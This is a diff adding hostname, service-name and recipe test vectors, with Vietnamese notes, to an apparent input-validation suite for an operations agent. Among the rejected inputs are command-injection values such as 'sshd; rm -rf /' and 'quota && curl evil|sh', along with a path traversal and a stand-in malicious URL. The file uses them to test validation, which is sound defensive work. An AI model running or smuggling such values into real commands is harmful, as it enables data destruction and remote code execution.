@@ -1,6 +1,6 @@
 {
   "version": 1,
-  "total": 93,
+  "total": 112,
   "categories": {
     "domain": {
       "schema": "agent-ops/defs.schema.json#/$defs/Domain",
@@ -602,6 +602,135 @@
           "expect": "reject",
           "layer": "semantic",
           "note": "Phiên bản không có trong gói/không được cài"
+        }
+      ]
+    },
+    "hostname": {
+      "schema": "agent-ops/defs.schema.json#/$defs/Hostname",
+      "vectors": [
+        {
+          "input": "srv-hn-01",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Hợp lệ"
+        },
+        {
+          "input": "srv01.itso.local",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "FQDN hợp lệ"
+        },
+        {
+          "input": "SRV01",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chữ hoa"
+        },
+        {
+          "input": "srv01;reboot",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chèn lệnh"
+        },
+        {
+          "input": "-srv01",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Bắt đầu bằng gạch nối"
+        },
+        {
+          "input": "srv01\nevil",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Xuống dòng"
+        },
+        {
+          "input": "",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Rỗng"
+        },
+        {
+          "input": "srv 01",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Khoảng trắng"
+        }
+      ]
+    },
+    "service_name": {
+      "schema": "agent-ops/defs.schema.json#/$defs/ServiceName",
+      "vectors": [
+        {
+          "input": "nginx",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Trong allowlist"
+        },
+        {
+          "input": "php8.3-fpm",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Trong allowlist"
+        },
+        {
+          "input": "itso-agent",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Agent không tự điều khiển mình"
+        },
+        {
+          "input": "sshd; rm -rf /",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chèn lệnh"
+        },
+        {
+          "input": "../../etc/systemd/system/evil",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Traversal"
+        },
+        {
+          "input": "docker",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Ngoài allowlist"
+        }
+      ]
+    },
+    "recipe": {
+      "schema": "agent-ops/defs.schema.json#/$defs/Recipe",
+      "vectors": [
+        {
+          "input": "quota",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Recipe có sẵn"
+        },
+        {
+          "input": "acl",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Recipe có sẵn"
+        },
+        {
+          "input": "https://evil.example/x.sh",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "URL tùy ý"
+        },
+        {
+          "input": "quota && curl evil|sh",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chèn lệnh"
+        },
+        {
+          "input": "apache2",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Ngoài allowlist"
         }
       ]
     }
